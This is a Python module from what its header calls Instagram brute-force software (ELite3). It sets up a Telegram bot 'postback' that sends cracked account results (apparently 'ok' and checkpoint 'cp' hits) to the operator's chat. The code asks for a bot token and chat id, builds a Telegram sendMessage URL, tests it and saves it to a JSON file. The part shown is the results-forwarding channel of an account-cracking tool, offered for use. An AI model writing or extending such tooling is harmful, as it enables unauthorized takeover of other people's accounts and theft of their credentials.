#!/usr/bin/env python

"""
Software instagram bruteforce
Copyright (c) 2023-2025 ELite3 developers (https://github.com/khamdihi-dev)
"""

import requests, json, time

class zhafaryna:
    def __init__(self):
        self.postback = {}

    def Beautypl(self):
        self.rest = input(' Kirim postback untuk result ok/cp/all : ').lower()
        self.token = input(' Bot token contoh (bot6933296436:PlFPLkPmlM4Eql-eQ2MxUPlNrmYa8NOY_q8) : ')
        self.chat_id = input(' Chat id : ')

        self.build_api = f'https://api.telegram.org/{self.token}/sendMessage?chat_id={self.chat_id}&text='
        print(f'\n Elite3 sedang mengecek api kamu, silahkan cek telegram jika masuk chat dari script ini maka kamu berhasil aktifin fitur postback\n api : {self.build_api}')
        self.chek_api = self.ChekZhafaApi(f'{self.build_api}Postback Elite3 Siap Di gunakan!!')
        if self.chek_api:
            self.postback.update({
                'Api':self.build_api + '{}',
                'send_data':self.rest,
            })
            print(f'\n Sukses postback kamu siap di gunakan')
            open('data/user_postback.json','w').write(json.dumps(self.postback,indent=4))
        else:
            print(f'\n Tampaknya ada yang salah di api kamu nih..')
        time.sleep(2)
        return
        

    def ChekZhafaApi(self, api) -> bool:
        try:
            response = requests.get(api)
            if response.status_code != 200:
                print(f'\n Status code : {response.status_code}\n response : {response.text}')
                return False
            return True
        except Exception as e:
            return False
